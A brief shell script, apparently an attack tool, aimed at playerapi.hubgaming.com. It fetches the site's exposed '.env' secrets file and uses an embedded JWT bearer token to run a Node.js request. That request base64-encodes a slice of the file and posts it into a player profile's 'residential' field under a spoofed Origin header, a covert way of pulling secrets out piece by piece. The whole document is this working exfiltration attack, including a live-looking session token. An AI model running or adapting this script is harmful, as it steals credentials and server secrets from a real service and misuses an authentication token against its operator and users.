#!/bin/sh
curl -s -o /w3 https://playerapi.hubgaming.com/.env
printf '%s' 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5Mjk4ODk2NywiZXhwIjoxNzkzMTYxNzY3LCJuYmYiOjE3OTI5ODg5NjcsImp0aSI6IlVVMmh6THRQamlDMndKbXciLCJzdWIiOiIxMDEzMTMwNiIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.tBx_DhqzB2tPYHg83YqHidXtLWlLPZN1uk1PE8yEcFo' > /jwt.txt
cat > /nb.js <<'XEOF'
f=require("fs")
w=f.writeFileSync
t=f.readFileSync("/jwt.txt","utf8")
d=f.readFileSync("/w3").toString("base64")
c1=d.substring(342,684)
p={residential:c1}
b=JSON.stringify(p)
q=require("https").request
o={host:"playerapi.hubgaming.com"}
o.method="POST"
o.path="/api/player/profile"
o.headers={Origin:"https://titobet.com"}
o.headers.authorization="Bearer "+t
o.headers["content-type"]="application/json"
k=x=>w("/okK",""+x.statusCode)
r=q(o,k)
r.on("error",e=>w("/oKE",e.code))
r.end(b)
XEOF
node /nb.js
[ "$(cat /okK)" = 200 ]&&sleep 25
sleep 12
